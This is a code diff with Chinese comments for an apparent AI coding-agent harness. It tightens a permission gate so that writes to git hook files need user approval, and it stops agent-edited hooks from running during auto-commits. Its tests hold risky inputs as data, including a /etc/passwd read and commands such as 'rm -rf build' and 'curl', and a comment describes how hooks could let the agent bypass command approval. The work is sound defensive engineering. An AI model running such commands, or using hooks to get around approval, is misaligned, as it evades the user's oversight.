@@ -997,7 +997,7 @@ export function startsImplementation(e: Pick<TimelineEvent, 'kind' | 'ref'>): bo
 }
 
 /**
- * 加上 ref 標記之前寫入的實作起點，只能比對顯示文字。
+ * 加上 ref 標記之前寫入的實作起點，只能比對顯示文字（開發期間建立的任務資料的相容）。
  * 只在整份時間軸都沒有標記時使用（新時間軸裡沒有 ref 的 user_text 是使用者自己打的字）。
  */
 export function legacyImplementStart(e: Pick<TimelineEvent, 'kind' | 'text' | 'ref'>): boolean {
@@ -2005,7 +2005,7 @@ export class Repository {
       null
     )
     if (!r) throw new Error(`找不到報告 v${version}`)
-    // 舊版報告沒有 tests（之後才加的欄位）：補上預設值，畫面與 PR 內文都不必再判斷
+    // 開發期間資料的相容：較早的報告沒有 tests（之後才加的欄位），補上預設值，畫面與 PR 內文都不必再判斷
     return { ...r, input: { ...r.input, tests: r.input.tests ?? [] } }
   }
 }
@@ -2167,9 +2167,24 @@ describe('hasShellOperators', () => {
 describe('suggestPattern', () => {
   test.each([
     ['npm test -- auth', 'npm test *'],
-    ['git diff', 'git diff *'],
+    ['  npm   run build ', 'npm run *'],
+    ['git status', 'git status *'],
     ['ls', 'ls *']
   ])('%s → %s', (c, p) => expect(suggestPattern(c)).toBe(p))
+
+  // 這些指令換個參數就可能刪檔、把結果寫到 worktree 外、連網或推送：只建議記住完全相同的指令
+  test.each([
+    ['git diff', 'git diff'],
+    ['git diff --stat HEAD~1', 'git diff --stat HEAD~1'],
+    ['git  log  -5', 'git log -5'],
+    ['git push origin main', 'git push origin main'],
+    ['rm -rf build', 'rm -rf build'],
+    ['curl -s https://example.com', 'curl -s https://example.com'],
+    ['sudo apt install jq', 'sudo apt install jq']
+  ])('危險的指令只建議完全相同的指令：%s → %s', (c, p) => {
+    expect(suggestPattern(c)).toBe(p)
+    expect(matchesPattern(c, suggestPattern(c))).toBe(true)
+  })
 })
 ```
 
@@ -2239,7 +2254,8 @@ import {
   createPermissionGate,
   createPreToolUseHook,
   evaluateTool,
-  type GateContext
+  type GateContext,
+  hooksDirInside
 } from '../../src/main/permissions/gate'
 import type { GatePhase } from '../../src/main/tasks/stateMachine'
 
@@ -2250,15 +2266,18 @@ function setup(
   phase: GatePhase,
   decision = { allow: true },
   patterns: string[] = [],
-  worktreePath = '/wt/t1'
+  worktreePath = '/wt/t1',
+  hooksDir?: string
 ) {
   const state = { phase }
   const ctx: GateContext = {
     getPhase: () => state.phase,
     worktreePath,
+    hooksDir,
     getAllowedPatterns: () => patterns,
     requestApproval: vi.fn(async () => decision),
-    onApproved: vi.fn()
+    onApproved: vi.fn(),
+    onBlocked: vi.fn()
   }
   const gate = createPermissionGate(ctx)
   const call = (
@@ -2266,7 +2285,7 @@ function setup(
     input: Record<string, unknown>,
     mcpServer?: McpServer,
     signal = new AbortController().signal
-  ) => gate(tool, input, { signal, mcpServer } as never)
+  ) => gate(tool, input, { signal, mcpServer, toolUseID: 'u1' } as never)
   const hook = createPreToolUseHook(ctx)
   const callHook = async (tool: string, toolInput: unknown, mcpServer?: McpServer) =>
     hookDecision(
@@ -2295,6 +2314,25 @@ function hookDecision(out: HookJSONOutput) {
 }
 
 describe('PermissionGate', () => {
+  test('規則拒絕時通知 onBlocked（Harness 擋下，不是使用者拒絕）；使用者拒絕不通知', async () => {
+    const { call, ctx } = setup('implement')
+    await call('Read', { file_path: '/etc/passwd' })
+    expect(ctx.onBlocked).toHaveBeenCalledWith('u1', '只能讀取 worktree 內的檔案')
+    const denied = setup('implement', { allow: false })
+    await denied.call('Bash', { command: 'npm run build' })
+    expect(denied.ctx.onBlocked).not.toHaveBeenCalled()
+  })
+
+  test('核准後任務狀態已改變：也算 Harness 擋下', async () => {
+    const { call, ctx, state } = setup('implement')
+    vi.mocked(ctx.requestApproval).mockImplementationOnce(async () => {
+      state.phase = 'clarify'
+      return { allow: true }
+    })
+    expect(await call('Bash', { command: 'npm run build' })).toMatchObject({ behavior: 'deny' })
+    expect(ctx.onBlocked).toHaveBeenCalledWith('u1', '任務狀態已改變')
+  })
+
   test('harness 工具與 TodoWrite 永遠允許', async () => {
     const { call } = setup('clarify')
     expect((await call('mcp__harness__ask_user', {}, OURS)).behavior).toBe('allow')
@@ -2437,6 +2475,86 @@ describe('PermissionGate', () => {
     )
   })
 
+  test('寫入 git hook 的設定與腳本（husky、.githooks、lefthook、pre-commit）需要使用者核准', async () => {
+    for (const file_path of [
+      '/wt/t1/.husky/pre-commit',
+      '/wt/t1/.husky/_/husky.sh',
+      '/wt/t1/packages/web/.husky/pre-push',
+      '/wt/t1/.githooks/pre-commit',
+      '/wt/t1/lefthook.yml',
+      '/wt/t1/lefthook-local.yaml',
+      '/wt/t1/.lefthook.toml',
+      '/wt/t1/.config/lefthook.json',
+      '/wt/t1/.lefthook/pre-commit/lint.sh',
+      '/wt/t1/.lefthook-local/pre-push/x.sh',
+      '/wt/t1/.pre-commit-config.yaml'
+    ]) {
+      expect(evaluateTool('Write', { file_path }, setup('implement').ctx).decision, file_path).toBe(
+        'ask'
+      )
+    }
+    // 名稱相近的一般檔案照常自動允許
+    for (const file_path of [
+      '/wt/t1/src/lefthook.ts',
+      '/wt/t1/docs/husky.md',
+      '/wt/t1/githooks/readme.md',
+      '/wt/t1/pre-commit-config.yaml'
+    ]) {
+      expect(evaluateTool('Write', { file_path }, setup('implement').ctx).decision, file_path).toBe(
+        'allow'
+      )
+    }
+  })
+
+  test('repo 設定的 core.hooksPath 在 worktree 內時，寫入那個資料夾需要使用者核准', async () => {
+    const { ctx } = setup('implement', { allow: true }, [], '/wt/t1', 'tools/hooks')
+    expect(evaluateTool('Write', { file_path: '/wt/t1/tools/hooks/pre-commit' }, ctx)).toEqual({
+      decision: 'ask',
+      message: expect.stringContaining('git hooks')
+    })
+    expect(evaluateTool('Edit', { file_path: 'tools/hooks/lib/run.sh' }, ctx).decision).toBe('ask')
+    expect(evaluateTool('Write', { file_path: '/wt/t1/tools/hooksx/a' }, ctx).decision).toBe(
+      'allow'
+    )
+    expect(evaluateTool('Write', { file_path: '/wt/t1/tools/build.sh' }, ctx).decision).toBe(
+      'allow'
+    )
+    // hooksPath 就是 worktree 根目錄：根目錄的檔案都可能是 hook
+    const atRoot = setup('implement', { allow: true }, [], '/wt/t1', '').ctx
+    expect(evaluateTool('Write', { file_path: '/wt/t1/pre-commit' }, atRoot).decision).toBe('ask')
+    expect(evaluateTool('Write', { file_path: '/wt/t1/src/a.ts' }, atRoot).decision).toBe('allow')
+  })
+
+  test('hooksDirInside：core.hooksPath 在 worktree 內時回傳相對路徑，否則 undefined', async () => {
+    const root = await mkdtemp(join(tmpdir(), 'harness-hooks-'))
+    expect(hooksDirInside(root, join(root, 'tools/hooks'))).toBe('tools/hooks')
+    expect(hooksDirInside(root, root)).toBe('')
+    expect(hooksDirInside(root, '/opt/hooks')).toBeUndefined()
+    expect(hooksDirInside(root, undefined)).toBeUndefined()
+  })
+
+  test('WebFetch／WebSearch 在釐清、規格、分岔與實作階段都要使用者核准（刻意的：查文件不改檔案）', async () => {
+    for (const phase of ['clarify', 'branch', 'implement'] as const) {
+      const { ctx, call, callHook } = setup(phase)
+      for (const [tool, input] of [
+        ['WebFetch', { url: 'https://docs.example/api', prompt: '找參數' }],
+        ['WebSearch', { query: 'node test runner mock timers' }]
+      ] as const) {
+        expect(evaluateTool(tool, input, ctx).decision, `${phase} ${tool}`).toBe('ask')
+        expect(await callHook(tool, input), `${phase} ${tool}`).toBe('ask')
+        expect(await call(tool, input)).toMatchObject({ behavior: 'allow' })
+      }
+      expect(ctx.requestApproval).toHaveBeenCalledTimes(2)
+      // 核准後不記住樣式（只有指令可以記住）
+      expect(ctx.onApproved).toHaveBeenCalledWith(undefined, undefined)
+    }
+    const closed = setup('closed')
+    expect(evaluateTool('WebFetch', { url: 'https://x.dev' }, closed.ctx).decision).toBe('deny')
+    // 使用者拒絕
+    const denied = setup('clarify', { allow: false } as never)
+    expect(await denied.call('WebSearch', { query: 'x' })).toMatchObject({ behavior: 'deny' })
+  })
+
   test('符合允許樣式的指令直接允許', async () => {
     const { call, ctx } = setup('implement', { allow: true }, ['npm test *'])
     expect((await call('Bash', { command: 'npm test -- auth' })).behavior).toBe('allow')
@@ -2522,6 +2640,17 @@ describe('PreToolUse hook', () => {
   test('釐清階段 Edit 被 hook 拒絕', async () => {
     const { callHook } = setup('clarify')
     expect(await callHook('Edit', { file_path: '/wt/t1/a.ts' })).toBe('deny')
+  })
+
+  test('規則拒絕（deny）時以 tool_use_id 通知 onBlocked；ask、allow 不通知', async () => {
+    const { callHook, ctx } = setup('clarify')
+    await callHook('Edit', { file_path: '/wt/t1/a.ts' })
+    expect(ctx.onBlocked).toHaveBeenCalledWith('u1', expect.stringContaining('目前不是實作階段'))
+    vi.mocked(ctx.onBlocked!).mockClear()
+    const impl = setup('implement')
+    await impl.callHook('Bash', { command: 'npm run build' })
+    await impl.callHook('Read', { file_path: '/wt/t1/a.ts' })
+    expect(impl.ctx.onBlocked).not.toHaveBeenCalled()
   })
 
   test('不在允許清單的 Bash 交給使用者核准（ask）', async () => {
@@ -2612,6 +2741,11 @@ export interface ApprovalRequest {
 export interface GateContext {
   getPhase(): GatePhase
   worktreePath: string
+  /**
+   * repo 設定的 core.hooksPath 在 worktree 內時，相對於 worktree 的路徑（'' 是 worktree 根目錄）；
+   * 每一輪開始時讀一次（見 hooksDirInside），寫入這個資料夾要核准
+   */
+  hooksDir?: string
   getAllowedPatterns(): string[]
   requestApproval(req: ApprovalRequest, signal: AbortSignal): Promise<PermissionDecision>
   onApproved(command: string | undefined, rememberPattern?: string): void
@@ -2625,7 +2759,7 @@ export interface GateContext {
 /** evaluateTool 只需要規則相關的部分（hook 另外會通知擋下） */
 export type GateRules = Pick<
   GateContext,
-  'getPhase' | 'worktreePath' | 'getAllowedPatterns' | 'onBlocked'
+  'getPhase' | 'worktreePath' | 'hooksDir' | 'getAllowedPatterns' | 'onBlocked'
 >
 
 export interface Evaluation {
@@ -2730,10 +2864,34 @@ function globEscapes(root: string, input: Record<string, unknown>): boolean {
   return !isInside(root, pattern)
 }
 
-/** .git、.claude/ 與 .mcp.json 會改變 git 或 Claude 的行為，修改前要人工核准 */
-function isProtected(rel: string): boolean {
+/** 存放 git hook 腳本的資料夾（husky、自訂的 .githooks、lefthook 的腳本） */
+const HOOK_DIRS = new Set(['.husky', '.githooks', '.lefthook', '.lefthook-local'])
+/** lefthook 與 pre-commit 的設定檔：決定 git hook 要執行什麼 */
+const HOOK_CONFIG = /^(\.?lefthook(-local)?\.(ya?ml|json|jsonc|toml)|\.pre-commit-config\.ya?ml)$/
+
+/**
+ * worktree 裡的 core.hooksPath 相對於 worktree 的路徑（'' 是 worktree 根目錄）；
+ * 沒有設定或在 worktree 外（寫入本來就會被拒絕）時 undefined
+ */
+export function hooksDirInside(root: string, hooksPath: string | undefined): string | undefined {
+  return hooksPath === undefined ? undefined : relativeInside(root, hooksPath)
+}
+
+/**
+ * .git、.claude/、.mcp.json 與 git hook（husky、.githooks、lefthook、pre-commit、core.hooksPath）
+ * 會改變 git、Claude 的行為或在 git 操作時執行程式，修改前要人工核准
+ */
+function isProtected(rel: string, hooksDir: string | undefined): boolean {
   const segs = rel.toLowerCase().split(sep)
-  return segs.includes('.git') || segs.includes('.claude') || segs.at(-1) === '.mcp.json'
+  const name = segs.at(-1) ?? ''
+  if (segs.includes('.git') || segs.includes('.claude') || name === '.mcp.json') return true
+  if (segs.some((s) => HOOK_DIRS.has(s)) || HOOK_CONFIG.test(name)) return true
+  if (hooksDir === undefined) return false
+  // hooksPath 是根目錄時，根目錄的檔案都可能是 hook；macOS 的檔案系統不分大小寫
+  if (hooksDir === '') return segs.length === 1
+  const dir = hooksDir.toLowerCase()
+  const r = rel.toLowerCase()
+  return r === dir || r.startsWith(dir + sep)
 }
 
 const allowE = (): Evaluation => ({ decision: 'allow' })
@@ -2773,8 +2931,11 @@ export function evaluateTool(
     if (paths.length === 0 || paths.some((p) => !p)) return denyE('缺少要修改的檔案路徑')
     const rels = paths.map((p) => relativeInside(root, p))
     if (rels.some((r) => r === undefined)) return denyE('只能修改 worktree 內的檔案')
-    if (rels.some((r) => isProtected(r!)))
-      return { decision: 'ask', message: '修改 git、Claude 或 MCP 設定檔需要使用者核准' }
+    if (rels.some((r) => isProtected(r!, ctx.hooksDir)))
+      return {
+        decision: 'ask',
+        message: '修改 git 設定、git hooks、Claude 或 MCP 設定檔需要使用者核准'
+      }
     return allowE()
   }
 
@@ -2972,6 +3133,41 @@ describe('GitService', () => {
     })
   })
 
+  test('commitAll 不執行任何 git hook（hook 檔案在 worktree 裡，Claude 改得到）', async () => {
+    await git.createWorktree(repo, wt, 'harness/t1', 'main')
+    // repo 設定的 core.hooksPath 指向 worktree 裡的 .husky：pre-commit 失敗、post-commit 寫標記
+    const marker = join(await mkdtemp(join(tmpdir(), 'harness-hook-')), 'ran')
+    await mkdir(join(wt, '.husky'))
+    for (const hook of ['pre-commit', 'commit-msg', 'post-commit']) {
+      await writeFile(
+        join(wt, '.husky', hook),
+        `#!/bin/sh\necho ${hook} >> "${marker}"\n${hook === 'pre-commit' ? 'exit 1\n' : ''}`,
+        { mode: 0o755 }
+      )
+    }
+    sh(repo, 'config', 'core.hooksPath', '.husky')
+    await writeFile(join(wt, 'a.txt'), 'one\ntwo\n')
+    expect(await git.commitAll(wt, 'change')).toMatch(/^[0-9a-f]{40}$/)
+    expect(existsSync(marker)).toBe(false)
+    expect(sh(wt, 'status', '--porcelain')).toBe('')
+    // 確認 hook 本身有效：一般的 git commit 會執行它（pre-commit 失敗）
+    await writeFile(join(wt, 'a.txt'), 'one\ntwo\nthree\n')
+    sh(wt, 'add', '-A')
+    expect(() =>
+      execFileSync('git', ['commit', '-q', '-m', 'x'], { cwd: wt, stdio: 'pipe' })
+    ).toThrow()
+    expect(existsSync(marker)).toBe(true)
+  })
+
+  test('hooksPath：回傳 repo 設定的 core.hooksPath（相對路徑以 worktree 為準）；沒設定時 undefined', async () => {
+    await git.createWorktree(repo, wt, 'harness/t1', 'main')
+    expect(await git.hooksPath(wt)).toBeUndefined()
+    sh(repo, 'config', 'core.hooksPath', '.githooks')
+    expect(await git.hooksPath(wt)).toBe(join(wt, '.githooks'))
+    sh(repo, 'config', 'core.hooksPath', '/opt/hooks')
+    expect(await git.hooksPath(wt)).toBe('/opt/hooks')
+  })
+
   test('改名視為刪除加新增，路徑不含 =>', async () => {
     await git.createWorktree(repo, wt, 'harness/t1', 'main')
     await rename(join(wt, 'a.txt'), join(wt, 'renamed.txt'))
@@ -3092,6 +3288,45 @@ describe('runCommand', () => {
   test('沒有 input 時 stdin 是空的，不會卡住', async () => {
     expect(await runCommand('cat', [], tmpdir())).toBe('')
   })
+
+  test('逾時就終止整個程序群組並回報錯誤，不會一直卡住', async () => {
+    const dir = await mkdtemp(join(tmpdir(), 'harness-hang-'))
+    const marker = join(dir, 'child-alive')
+    const started = Date.now()
+    // 子程序（sh 底下的 sleep）也要一起終止：留著的話會佔住輸出管線
+    await expect(
+      runCommand('sh', ['-c', `(sleep 2; touch "${marker}") & sleep 30`], dir, { timeoutMs: 200 })
+    ).rejects.toThrow('逾時')
+    expect(Date.now() - started).toBeLessThan(1500)
+    await new Promise((r) => setTimeout(r, 2500))
+    expect(existsSync(marker)).toBe(false)
+  })
+})
+
+describe('GitService 的逾時', () => {
+  test('push 卡住時依設定的上限終止並回報錯誤（開 PR 不會一直等）', async () => {
+    const slow = new GitService({ timeouts: { network: 300 } })
+    await slow.createWorktree(repo, wt, 'harness/t1', 'main')
+    // ssh 連線卡住：core.sshCommand 只是 sleep
+    sh(repo, 'remote', 'add', 'origin', 'ssh://example.invalid/repo.git')
+    sh(repo, 'config', 'core.sshCommand', "sh -c 'sleep 30' --")
+    const started = Date.now()
+    await expect(slow.pushAndOpenPr(wt, 'harness/t1', 'main', 't', 'b')).rejects.toThrow('逾時')
+    expect(Date.now() - started).toBeLessThan(3000)
+  })
+
+  test('預設上限：commit 120 秒、push 與 gh 300 秒、其他 60 秒', () => {
+    expect(new GitService().timeouts).toEqual({
+      default: 60_000,
+      commit: 120_000,
+      network: 300_000
+    })
+    expect(new GitService({ timeouts: { commit: 5 } }).timeouts).toEqual({
+      default: 60_000,
+      commit: 5,
+      network: 300_000
+    })
+  })
 })
 
 describe('parseNumstat', () => {
@@ -3142,7 +3377,12 @@ export interface RunOptions {
   env?: Record<string, string>
   /** 寫入 stdin 的內容；沒給時 stdin 為空 */
   input?: string
+  /** 逾時毫秒數（預設 60 秒）：逾時就終止整個程序群組並回報錯誤，不會一直卡住 */
+  timeoutMs?: number
 }
+
+/** 逾時送出 SIGTERM 後，等這麼久還沒結束就送 SIGKILL */
+const KILL_GRACE_MS = 1000
 
 export function runCommand(
   cmd: string,
@@ -3151,15 +3391,41 @@ export function runCommand(
   opts: RunOptions = {}
 ): Promise<string> {
   const command = `${cmd} ${args.join(' ')}`
+  const timeoutMs = opts.timeoutMs ?? DEFAULT_GIT_TIMEOUTS.default
   return new Promise((done, fail) => {
     const child = spawn(cmd, args, {
       cwd,
       // GIT_TERMINAL_PROMPT=0：需要帳密時直接失敗，不要卡在看不到的提示
       env: { ...process.env, GIT_TERMINAL_PROMPT: '0', ...opts.env },
-      stdio: [opts.input === undefined ? 'ignore' : 'pipe', 'pipe', 'pipe']
+      stdio: [opts.input === undefined ? 'ignore' : 'pipe', 'pipe', 'pipe'],
+      // 自成 process group：逾時可連同子程序（git 底下的 ssh、hook，gh 的子程序）一起終止
+      detached: true
     })
     let stdout = ''
     let stderr = ''
+    let settled = false
+    const settle = (fn: () => void) => {
+      if (settled) return
+      settled = true
+      clearTimeout(timer)
+      fn()
+    }
+    const killGroup = (signal: NodeJS.Signals) => {
+      try {
+        if (child.pid) process.kill(-child.pid, signal)
+        else child.kill(signal)
+      } catch {
+        /* 已經結束 */
+      }
+    }
+    const timer = setTimeout(() => {
+      killGroup('SIGTERM')
+      setTimeout(() => killGroup('SIGKILL'), KILL_GRACE_MS)
+      // 不等 close：子程序可能還佔著輸出管線
+      settle(() =>
+        fail(new CommandError(command, `執行逾時（超過 ${timeoutMs / 1000} 秒），已終止`))
+      )
+    }, timeoutMs)
     child.stdout?.setEncoding('utf8').on('data', (s: string) => (stdout += s))
     child.stderr?.setEncoding('utf8').on('data', (s: string) => (stderr += s))
     if (child.stdin) {
@@ -3168,23 +3434,40 @@ export function runCommand(
       })
       child.stdin.end(opts.input)
     }
-    child.on('error', (err) => fail(new CommandError(command, err.message)))
-    child.on('close', (code, signal) => {
-      if (code === 0) done(stdout)
-      else
-        fail(
-          new CommandError(command, stderr.trim() || stdout.trim() || `結束代碼 ${code ?? signal}`)
-        )
-    })
+    child.on('error', (err) => settle(() => fail(new CommandError(command, err.message))))
+    child.on('close', (code, signal) =>
+      settle(() => {
+        if (code === 0) done(stdout)
+        else
+          fail(
+            new CommandError(
+              command,
+              stderr.trim() || stdout.trim() || `結束代碼 ${code ?? signal}`
+            )
+          )
+      })
+    )
   })
 }
 
-/** core.quotePath=false：非 ASCII 路徑原樣輸出，不用八進位跳脫 */
-const git = (cwd: string, ...args: string[]) =>
-  runCommand('git', ['-c', 'core.quotePath=false', ...args], cwd)
+/** git／gh 指令的逾時上限（毫秒） */
+export interface GitTimeouts {
+  /** 查詢、diff、刪除 worktree 等其他操作 */
+  default: number
+  /** commit、合併、建立 worktree（會寫入檔案或執行 hook） */
+  commit: number
+  /** push 與 gh pr create（走網路） */
+  network: number
+}
+export const DEFAULT_GIT_TIMEOUTS: GitTimeouts = {
+  default: 60_000,
+  commit: 120_000,
+  network: 300_000
+}
 
-const gitEnv = (cwd: string, env: Record<string, string>, ...args: string[]) =>
-  runCommand('git', ['-c', 'core.quotePath=false', ...args], cwd, { env })
+/** core.quotePath=false：非 ASCII 路徑原樣輸出，不用八進位跳脫 */
+const gitRun = (cwd: string, args: string[], opts: RunOptions = {}) =>
+  runCommand('git', ['-c', 'core.quotePath=false', ...args], cwd, opts)
 
 /** diff 輸出固定格式：不上色、不走外部 diff 工具、改名視為刪除＋新增 */
 const DIFF_FLAGS = ['--no-color', '--no-ext-diff', '--no-renames']
@@ -3194,7 +3477,7 @@ export async function assertRefName(cwd: string, name: string): Promise<void> {
   const invalid = () => new CommandError('git check-ref-format', `不合法的分支名稱：${name}`)
   if (!name || name.startsWith('-')) throw invalid()
   try {
-    await git(cwd, 'check-ref-format', '--branch', name)
+    await gitRun(cwd, ['check-ref-format', '--branch', name])
   } catch {
     throw invalid()
   }
@@ -3222,16 +3505,26 @@ export function parseNumstat(out: string): DiffStats {
 }
 
 export class GitService {
+  readonly timeouts: GitTimeouts
+
+  constructor(opts: { timeouts?: Partial<GitTimeouts> } = {}) {
+    this.timeouts = { ...DEFAULT_GIT_TIMEOUTS, ...opts.timeouts }
+  }
+
+  private git(cwd: string, ...args: string[]) {
+    return gitRun(cwd, args, { timeoutMs: this.timeouts.default })
+  }
+
   async isRepo(dir: string): Promise<boolean> {
     try {
-      return (await git(dir, 'rev-parse', '--is-inside-work-tree')).trim() === 'true'
+      return (await this.git(dir, 'rev-parse', '--is-inside-work-tree')).trim() === 'true'
     } catch {
       return false
     }
   }
 
   async repoRoot(dir: string) {
-    return (await git(dir, 'rev-parse', '--show-toplevel')).trim()
+    return (await this.git(dir, 'rev-parse', '--show-toplevel')).trim()
   }
 
   /**
@@ -3239,7 +3532,7 @@ export class GitService {
    * 會多出「(HEAD detached at …)」這種不是分支的項目；lstrip=2 在分支和 tag 同名時也不會變成 heads/x。
    */
   async branches(repo: string) {
-    return (await git(repo, 'for-each-ref', '--format=%(refname:lstrip=2)', 'refs/heads/'))
+    return (await this.git(repo, 'for-each-ref', '--format=%(refname:lstrip=2)', 'refs/heads/'))
       .split('\n')
       .map((s) => s.trim())
       .filter(Boolean)
@@ -3251,7 +3544,7 @@ export class GitService {
    */
   async currentBranch(repo: string) {
     try {
-      return (await git(repo, 'symbolic-ref', '--quiet', 'HEAD'))
+      return (await this.git(repo, 'symbolic-ref', '--quiet', 'HEAD'))
         .trim()
         .replace(/^refs\/heads\//, '')
     } catch {
@@ -3269,19 +3562,46 @@ export class GitService {
     await assertRefName(repo, branch)
     await assertRefName(repo, base)
     await mkdir(dirname(worktreePath), { recursive: true })
-    await git(repo, 'worktree', 'add', '-b', branch, '--end-of-options', worktreePath, base)
+    await gitRun(repo, ['worktree', 'add', '-b', branch, '--end-of-options', worktreePath, base], {
+      timeoutMs: this.timeouts.commit
+    })
   }
 
+  /**
+   * commit worktree 裡的所有變更（提交報告時由 app 自動執行）。不執行任何 git hook：
+   * hook（.husky/、.githooks/、lefthook、pre-commit、core.hooksPath 指向的資料夾）是 worktree 裡
+   * Claude 改得到的檔案，在這裡執行等於讓 Claude 不經指令核准就跑任意程式。
+   * --no-verify 只跳過 pre-commit 與 commit-msg，所以再把 core.hooksPath 指到 /dev/null，
+   * post-commit 等其他 hook 也不會執行。合併與 push 是使用者看過 diff 後按的，照常執行 hook。
+   */
   async commitAll(wt: string, message: string): Promise<string | null> {
-    await git(wt, 'add', '-A')
-    if (!(await git(wt, 'diff', '--cached', '--name-only')).trim()) return null
-    // 刻意不加 --no-verify：repo 的 git hooks 照常執行
-    await git(wt, 'commit', '-q', '-m', message)
-    return (await git(wt, 'rev-parse', 'HEAD')).trim()
+    await this.git(wt, 'add', '-A')
+    if (!(await this.git(wt, 'diff', '--cached', '--name-only')).trim()) return null
+    await gitRun(
+      wt,
+      ['-c', 'core.hooksPath=/dev/null', 'commit', '--no-verify', '-q', '-m', message],
+      { timeoutMs: this.timeouts.commit }
+    )
+    return (await this.git(wt, 'rev-parse', 'HEAD')).trim()
+  }
+
+  /**
+   * repo 設定的 core.hooksPath（絕對路徑；相對路徑以 worktree 根目錄為準，`~` 由 git 展開），
+   * 沒有設定時 undefined。PermissionGate 用它把 worktree 裡的 hook 資料夾列為受保護的路徑。
+   */
+  async hooksPath(wt: string): Promise<string | undefined> {
+    let out: string
+    try {
+      out = await this.git(wt, 'config', '--type=path', '--get', 'core.hooksPath')
+    } catch {
+      return undefined
+    }
+    const p = out.trim()
+    return p ? resolve(wt, p) : undefined
   }
 
   diff(wt: string, base: string) {
-    return git(
+    return this.git(
       wt,
       'diff',
       ...DIFF_FLAGS,
@@ -3294,7 +3614,15 @@ export class GitService {
 
   async diffStats(wt: string, base: string) {
     return parseNumstat(
-      await git(wt, 'diff', '--numstat', '-z', ...DIFF_FLAGS, '--end-of-options', `${base}...HEAD`)
+      await this.git(
+        wt,
+        'diff',
+        '--numstat',
+        '-z',
+        ...DIFF_FLAGS,
+        '--end-of-options',
+        `${base}...HEAD`
+      )
     )
   }
 
@@ -3303,23 +3631,18 @@ export class GitService {
    * `add -N` 在暫存的 index 複本上做，不改動 worktree 真正的 index。
    */
   async workingStats(wt: string, base: string) {
-    const mergeBase = (await git(wt, 'merge-base', '--end-of-options', base, 'HEAD')).trim()
-    const realIndex = resolve(wt, (await git(wt, 'rev-parse', '--git-path', 'index')).trim())
+    const mergeBase = (await this.git(wt, 'merge-base', '--end-of-options', base, 'HEAD')).trim()
+    const realIndex = resolve(wt, (await this.git(wt, 'rev-parse', '--git-path', 'index')).trim())
     const tmp = await mkdtemp(join(tmpdir(), 'harness-index-'))
-    const env = { GIT_INDEX_FILE: join(tmp, 'index') }
+    const opts = { env: { GIT_INDEX_FILE: join(tmp, 'index') }, timeoutMs: this.timeouts.default }
     try {
-      if (existsSync(realIndex)) await copyFile(realIndex, env.GIT_INDEX_FILE)
-      await gitEnv(wt, env, 'add', '-A', '-N')
+      if (existsSync(realIndex)) await copyFile(realIndex, opts.env.GIT_INDEX_FILE)
+      await gitRun(wt, ['add', '-A', '-N'], opts)
       return parseNumstat(
-        await gitEnv(
+        await gitRun(
           wt,
-          env,
-          'diff',
-          '--numstat',
-          '-z',
-          ...DIFF_FLAGS,
-          '--end-of-options',
-          mergeBase
+          ['diff', '--numstat', '-z', ...DIFF_FLAGS, '--end-of-options', mergeBase],
+          opts
         )
       )
     } finally {
@@ -3330,18 +3653,24 @@ export class GitService {
   async merge(repo: string, branch: string, base: string) {
     await assertRefName(repo, branch)
     await assertRefName(repo, base)
-    if ((await git(repo, 'status', '--porcelain')).trim()) {
+    if ((await this.git(repo, 'status', '--porcelain')).trim()) {
       throw new CommandError('git status', '原 repo 有未提交的變更，請先處理後再合併')
     }
     const current = await this.currentBranch(repo)
     if (current !== base)
       throw new CommandError('git rev-parse', `原 repo 目前在 ${current}，請切回 ${base} 再合併`)
     try {
-      // 刻意不加 --no-verify：repo 的 git hooks 照常執行
-      await git(repo, 'merge', '--no-ff', '-m', `Merge ${branch}`, '--end-of-options', branch)
+      // 刻意不加 --no-verify：合併是使用者看過報告與 diff 後按的，repo 的 git hooks 照常執行
+      await gitRun(
+        repo,
+        ['merge', '--no-ff', '-m', `Merge ${branch}`, '--end-of-options', branch],
+        {
+          timeoutMs: this.timeouts.commit
+        }
+      )
     } catch (e) {
       // 衝突時還原成合併前的狀態，錯誤訊息保留 git 的 CONFLICT 輸出
-      await git(repo, 'merge', '--abort').catch(() => undefined)
+      await this.git(repo, 'merge', '--abort').catch(() => undefined)
       const detail = e instanceof CommandError ? e.stderr : String(e)
       throw new CommandError(
         `git merge ${branch}`,
@@ -3353,16 +3682,22 @@ export class GitService {
   async removeWorktree(repo: string, wt: string, branch: string) {
     await assertRefName(repo, branch)
     try {
-      await git(repo, 'worktree', 'remove', '--force', '--end-of-options', wt)
+      await this.git(repo, 'worktree', 'remove', '--force', '--end-of-options', wt)
     } catch (e) {
       // 目錄已被手動刪掉時 remove 會失敗，prune 掉紀錄即可；目錄還在就是真的失敗
-      await git(repo, 'worktree', 'prune').catch(() => undefined)
+      await this.git(repo, 'worktree', 'prune').catch(() => undefined)
       if (existsSync(wt)) throw e
     }
     try {
-      await git(repo, 'branch', '-D', '--end-of-options', branch)
+      await this.git(repo, 'branch', '-D', '--end-of-options', branch)
     } catch (e) {
-      const exists = await git(repo, 'rev-parse', '--verify', '--quiet', `refs/heads/${branch}`)
+      const exists = await this.git(
+        repo,
+        'rev-parse',
+        '--verify',
+        '--quiet',
+        `refs/heads/${branch}`
+      )
         .then(() => true)
         .catch(() => false)
       if (exists) throw e
@@ -3378,7 +3713,10 @@ export class GitService {
   ): Promise<string> {
     await assertRefName(wt, branch)
     await assertRefName(wt, base)
-    await git(wt, 'push', '-u', '--end-of-options', 'origin', branch)
+    // push 照常執行 pre-push hook：使用者看過報告與 diff 後才按開 PR
+    await gitRun(wt, ['push', '-u', '--end-of-options', 'origin', branch], {
+      timeoutMs: this.timeouts.network
+    })
     const out = await runCommand(
       'gh',
       [
@@ -3391,7 +3729,7 @@ export class GitService {
         '-'
       ],
       wt,
-      { input: body }
+      { input: body, timeoutMs: this.timeouts.network }
     )
     return out.trim().split('\n').pop() ?? ''
   }
@@ -3406,6 +3744,7 @@ export type GitLike = Pick<
   | 'branchInfo'
   | 'createWorktree'
   | 'commitAll'
+  | 'hooksPath'
   | 'diff'
   | 'diffStats'
   | 'workingStats'
@@ -3706,10 +4045,12 @@ import { afterEach, describe, expect, test } from 'vitest'
 import type { ClaudeStatus } from '@shared/types'
 import {
   applyLoginShellPath,
+  claudeEnv,
   createClaudeStatusCache,
   detectClaude,
   execCapture,
-  type Exec
+  type Exec,
+  type ExecOptions
 } from '../../src/main/claude/detect'
 
 function fakeExec(map: Record<string, string | Error>): Exec {
@@ -3733,7 +4074,9 @@ describe('detectClaude', () => {
           subscriptionType: 'max',
           email: 'a@b'
         })
-      })
+      }),
+      undefined,
+      { PATH: '/usr/bin' }
     )
     expect(s).toEqual({
       found: true,
